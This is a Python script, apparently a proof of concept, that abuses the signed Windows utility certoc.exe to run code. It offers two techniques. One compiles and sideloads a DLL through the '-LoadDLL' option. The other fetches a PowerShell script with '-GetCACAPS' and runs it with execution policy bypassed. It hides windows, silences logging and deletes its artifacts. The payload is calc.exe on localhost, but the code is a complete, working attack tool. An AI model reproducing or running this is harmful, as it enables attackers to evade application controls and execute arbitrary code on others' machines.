import os
import sys
import shutil
import time
import threading
import subprocess
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer

HOST = "127.0.0.1"
PORT = 8000
DLL_NAME = "payload.dll"
PS_SCRIPT = "payload.ps1"
WORK_DIR = r"C:\Temp\CertocExploit"
PAYLOAD_SOURCE = r"C:\Windows\System32\calc.exe"
CL_EXE_PATH = r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe"
CERTOC_PATH = r"C:\Windows\System32\certoc.exe"
VS_PATHS = [
            r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat",
            r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
        ]

class SilentHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'): pass
    def log_message(self, format, *args): pass

def setup_environment():
    try:
        os.makedirs(WORK_DIR, exist_ok=True)
        return True
    except Exception as e:
        return False

def start_http_server():
    os.chdir(WORK_DIR)
    with TCPServer((HOST, PORT), SilentHTTPRequestHandler) as httpd:
        httpd.serve_forever()

def create_malicious_dll():
    calc_path = os.path.join(WORK_DIR, "calc.exe").replace("\\", "\\\\")
    dll_code = f"""
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
        system("{calc_path}");
    }}
    return TRUE;
}}
"""
    try:
        with open(os.path.join(WORK_DIR, "payload.c"), "w") as f:
            f.write(dll_code)
                
        for vcvars_path in VS_PATHS:
            if os.path.exists(vcvars_path):
                result = subprocess.run(
                    f'call "{vcvars_path}" x64 && '
                    f'"{CL_EXE_PATH}" /nologo /LD "{os.path.join(WORK_DIR, "payload.c")}" '
                    f'/Fe"{os.path.join(WORK_DIR, DLL_NAME)}"',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                if result.returncode == 0:
                    return True
        
        return False
        
    except Exception as e:
        return False

def create_powershell_script():
    ps_code = f"""Start-Process "{os.path.join(WORK_DIR, "calc.exe")}" -WindowStyle Hidden"""
    try:
        with open(os.path.join(WORK_DIR, PS_SCRIPT), "w") as f:
            f.write(ps_code)
        return True
    except Exception as e:
        return False

def execute_via_dll():
    try:
        shutil.copy(PAYLOAD_SOURCE, os.path.join(WORK_DIR, "calc.exe"))
        
        if not create_malicious_dll():
            return False
        
        result = subprocess.run(
            f'"{CERTOC_PATH}" -LoadDLL "{os.path.join(WORK_DIR, DLL_NAME)}"',
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.returncode == 0
    except Exception as e:
        return False

def execute_via_powershell():
    try:
        shutil.copy(PAYLOAD_SOURCE, os.path.join(WORK_DIR, "calc.exe"))
        
        if not create_powershell_script():
            return False
        
        server_thread = threading.Thread(target=start_http_server, daemon=True)
        server_thread.start()
        time.sleep(1)
        
        ps_command = f"""
        $url = "http://{HOST}:{PORT}/{PS_SCRIPT}"
        $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
        certoc.exe -GetCACAPS $url > $tempFile
        powershell.exe -ExecutionPolicy Bypass -File $tempFile
        """
        
        subprocess.run(
            ['powershell.exe', '-Command', ps_command],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except Exception as e:
        return False

def cleanup():
    try:
        for f in [DLL_NAME, "payload.c", "payload.obj", "payload.exp", 
                 "payload.lib", "calc.exe", "downloaded.ps1", PS_SCRIPT]:
            try:
                os.remove(os.path.join(WORK_DIR, f))
            except:
                pass
    except Exception as e:
        sys.exit(1)

def main():
    if not setup_environment():
        sys.exit(1)
        
    try:
        choice = input("[?] Select technique (1/2): ").strip()
    except KeyboardInterrupt:
        cleanup()
        sys.exit(0)
    
    if choice == "1":
        execute_via_dll()
    elif choice == "2":
        execute_via_powershell()
    else:
        print("[-] Invalid choice")
    
    cleanup()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cleanup()
